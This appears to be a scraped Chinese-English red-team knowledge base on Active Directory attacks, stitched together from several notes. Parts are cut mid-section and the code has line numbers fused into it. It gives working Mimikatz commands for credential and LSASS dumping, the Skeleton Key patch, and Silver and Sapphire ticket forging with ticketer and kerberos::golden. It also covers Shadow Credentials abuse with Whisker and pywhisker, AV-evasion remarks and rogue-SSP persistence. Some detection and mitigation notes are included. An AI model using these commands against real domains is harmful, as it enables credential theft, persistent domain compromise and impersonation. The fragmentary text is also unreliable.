身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：凭据 Mimikatz、Invoke-Mimikatz、凭据 with Meterpreter、Bypassing AV、Procdump + Mimikatz；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 32 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 凭据 Mimikatz Invoke-Mimikatz 凭据 with Meterpreter Bypassing AV Procdump + Mimikatz Dumping lsass with comsvcs.dll Dumping lsass with Task Manager Dumping lsass with procdump Dumpin lsass with PPLBlade LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump CrackMapExec Dump SAM hashes Dump LSA secrets Dump the NTDS.dit from target DC Dump the NTDS.dit 密码 history from target DC Show the pwdLastSet attribute for each NTDS.dit account Stealing SAM & SYSTEM From Registry # 核心要点 Learn about some possible 凭据 protections here. This protections could prevent Mimikatz from extracting some 凭据. Use the 凭据 Plugin that I have created to search for passwords and hashes inside the victim. As Procdump from SysInternals is a legitimate Microsoft tool, it's not detected by Defender.\ You can use this tool to dump the lsass process, 下载 the dump and extract the 凭据 locally from the dump. Utilization of the comsvcs.dll is feasible for dumping the lsass process, thereby eliminating the need to 上传 and execute procdump. This method is described in detail at https://en.hackndo.com/remote-lsass-dump-passwords/. Bypassing PPL protection Keep lals.exe, fdp.dll, nfdp.dll, and rtu.txt in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to rtu.txt, so splitting them breaks the chain. %TEMP%*.ddt files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction. Running lals.exe requires admin/SeTcb rights so AddSecurityPackageA succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2. Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term 持久化. 下载 those files to your Kali machine and extract the hashes using: Outbound RDP targets – parse every user hive at HKU<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers*. Each subkey stores the server name, UsernameHint, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell: Setting DisableRestrictedAdmin=1 forces full credential/ticket reuse during RDP, enabling 哈希传递 style pivots. LocalAccountTokenFilterPolicy=1 disables UAC 令牌 filtering so local admins get unrestricted tokens over the network. # 命令 / 载荷 / 操作片段 # 1. 凭据 Mimikatz 1234567891011#Elevate Privileges to extract the credentialsprivilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Adminstoken::elevate#Extract from lsass (memory)sekurlsa::logonpasswords#Extract from lsass (service)lsadump::lsa /inject#Extract from SAMlsadump::sam#One linermimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit" # 2. title: Skeleton key 技术笔记
content: 来源路径： 02-知识点/域与Windows/Skeleton key 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Skeleton key 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Skeleton key 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Skeleton key 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Skeleton key、Theory、Practice、Skeleton Key Attack、Execution；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Skeleton key Theory Practice Skeleton Key Attack Execution Mitigations # 核心要点 Skeleton key injects itself into the LSASS process of a Domain Controller to create the master 密码. It requires Domain Admin rights and SeDebugPrivilege on the target (which are given by default to domain admins). Since this attack is conducted in memory by reserving a region of memory with VirtualAllocEx () and by patching functions, the master 密码 doesn't remain active after a DC reboot. This attack currently supports NTLM and Kerberos (RC4 only) authentications. Below are a few explanation of how it works depending on the 认证 protocol it injects a master key for. The attack employs a three-steps process to create a master 密码 for NTLM 认证. Reserves a memory region using VirtualAllocEx () for the lsass.exe process. This memory space is used to store a modified version of the NTLM 密码 validation function MsvpPasswordValidate (). Attaches itself to the lsass.exe process and locates MsvpSamValidate () (认证 function) from MSV1 0.dll (which is the DLL in charge of NTLM 认证). Requires Domain Admin/SYSTEM + SeDebugPrivilege on every DC and must be reapplied after each reboot. Patches NTLM and Kerberos RC4 (etype 0x17) validation paths; AES-only realms or accounts enforcing AES will not accept the skeleton key. The Mimikatz module accepts the optional switch /letaes to avoid touching Kerberos/AES hooks in case of compatibility issues. If LSASS is running as PPL (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), a kernel driver is needed to remove protection before patching LSASS: After injection, authenticate with any domain account but use 密码 mimikatz (or the value set by the operator). Remember to repeat on all DCs in multi‑DC environments. Security Event ID 4673/4611 for sensitive privilege use or LSA 认证 package registration anomalies; correlate with unexpected 4624 logons using RC4 (etype 0x17) from DCs. Keep RunAsPPL/Credential Guard/Secure LSASS enabled on DCs to force attackers into kernel‑mode driver deployment (more telemetry, harder 利用). Disable legacy RC4 where possible; Kerberos tickets limited to AES prevent the RC4 hook path used by the skeleton key. Quick PowerShell hunts: Detect unsigned kernel driver installs: Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$ .message -like "Kernel Mode Driver"} Hunt for Mimikatz driver: Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$ .message -like "Kernel Mode Driver" -and $ .message -like "mimidrv"} Validate PPL is enforced after reboot: Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$ .message -like "protected process"} # 命令 / 载荷 / 操作片段 # 1. Practice 1mimikatz "privilege::debug" "misc::skeleton" # 2. Execution 12mimikatz # privilege::debugmimikatz # misc::skeleton # 3. content: 来源路径： 02-知识点/域与Windows/Silver tickets 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Silver tickets 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Silver tickets 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Silver tickets 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Silver tickets、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Silver tickets Theory Practice # 核心要点 In order to craft a 白银票据，testers need to find the target service account's RC4 key (i.e. NT 哈希) or AES key (128 or 256 bits). This can be done by capturing an NTLM response (preferably NTLMv1) and cracking it, by dumping LSA secrets, by doing a DCSync, etc. "While the scope is more limited than Golden Tickets, the required 哈希 is easier to get and there is no communication with a DC when using them, so 检测 is more difficult than Golden Tickets." ( adsecurity.org ) The Impacket script ticketer can create silver tickets. On Windows, mimikatz can be used to generate a 白银票据 with kerberos::golden. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage. For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket. A great, stealthier, alternative to 白银票据 is to abuse S4U2self in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything. # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# Find the domain SIDlookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0# with an NT hashpython ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"# with an AES (128 or 256 bits) keypython ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username" # 2. Practice 12345678# with an NT hashkerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt# with an AES 128 keykerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt# with an AES 256 keykerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt # 工具与参考入口 adsecurity.org Impacket ticketer adsecurity.org mimikatz kerberos::golden https://en.hackndo.com/kerberos-silver-golden-tickets/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Shadow 凭据
content: 来源路径： 02-知识点/域与Windows/Shadow 凭据.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Shadow 凭据 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Shadow 凭据 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Shadow 凭据 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、Intro <a href="#3f17" id="3f17"></a>、Requirements、Abuse；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice Intro <a href="#3f17" id="3f17"></a> Requirements Abuse 工具 Whisker pyWhisker ShadowSpray # 核心要点 In order to 利用 that technique, the attacker needs to: be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place). have control over an account that can edit the target object's msDs-KeyCredentialLink attribute. The msDS-KeyCredentialLink feature was introduced with Windows Server 2016. However, this is not to be confused with PKINIT which was already present in Windows 2000. The msDS-KeyCredentialLink feature allows to link an X509 certificate to a domain object, that's all. If those per-requisites are met, an attacker can create an X509 certificate configured with the public key As summary: if you can write to the msDS-KeyCredentialLink property of a user/computer, you can retrieve the NT 哈希 of that object. The Domain Controller must have a server 认证 digital certificate installed. An account with delegated rights to modify the msDS-KeyCredentialLink attribute of the target object is required. The abuse of Key Trust for computer objects encompasses steps beyond obtaining a Ticket Granting Ticket (TGT) and the NTLM 哈希. The options include: Creating an RC4 白银票据 to act as privileged users on the intended host. Using the TGT with S4U2Self for impersonation of privileged users, necessitating alterations to the Service Ticket to add a service class to the service name. Add: Generates a key pair and adds a key credential. List: Displays all key credential entries. Remove: Deletes a specified key credential. Clear: Erases all key 凭据，potentially disrupting legitimate WHfB usage. # 命令 / 载荷 / 操作片段 # 1. Practice 1pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list" # 2. Practice 1Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password" # 3. Practice 1234567891011# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# List the keys of a principal (not specifying -Object switch would list all targets with an msDs-KeyCredentialLink attribute)Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'ShadowCreds' -Object 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'# Populates the targeted account's 'msDS-KeyCredentialLink' attribute with a new self-signed certificate.Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL' # 4. Whisker 1Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1 # 5. pyWhisker 1python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list" # 工具与参考入口 specterops.io KeyCredential pyWhisker Whisker Invoke-PassTheCert certreq ShadowSpray # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

In AD CS environments, exfiltrate the CA’s key material (machine key store) to mint “Golden Certificates” and impersonate any domain principal via PKINIT. See link below. Open a raw volume handle and read clusters: FTK Imager or The Sleuth Kit (read-only imaging, then carve files) vssadmin/diskshadow + shadow copy, then copy target file from the snapshot (if you can create VSS; often requires admin but commonly available to the same operators that hold SeManageVolumePrivilege) Strongly limit assignment of SeManageVolumePrivilege (Perform volume maintenance tasks) to only trusted admins. Monitor Sensitive Privilege Use and process handle opens to device objects like \.\C:, \.\PhysicalDrive0. Prefer HSM/TPM-backed CA keys or DPAPI-NG so that raw file reads cannot recover key material in usable form. Keep uploads, temp, and extraction paths non-executable and separated (web context defense that often pairs with this chain post‑利用). # 命令 / 载荷 / 操作片段 # 1. There will be no discrepancy anymore between what's in the PAC and what's in Active Directory 域. From UNIX-like systems, Impacket's ticketer (Python) script can be used for such purposes with the -impersonate argument. In 2021, Microsoft issued a patch (KB5008380) for CVE-2021-42287 (see samaccountname-spoofing.md). The patch is explained a bit more in this blogpost. When the patch entered its enforcement phase (Oct. 11th 2022), it made the Sapphire Ticket attack harder to conduct. When using the Sapphire Ticket technique to forge a TGT, if the two structures are missing from the forget ticket, a KDC ERR TGT REVOKED error will be raised in environments that have the patch installed. # 命令 / 载荷 / 操作片段 # 1. Practice 12345ticketer.py -request -impersonate 'domainadmin' \-domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \-nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \-user-id '1115' -domain-sid 'S-1-5-21-...' \'baduser' # 工具与参考入口 Impacket ticketer KB5008380 CVE-2021-42287 this blogpost Impacket 1391 1545 Rubeus 105 https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
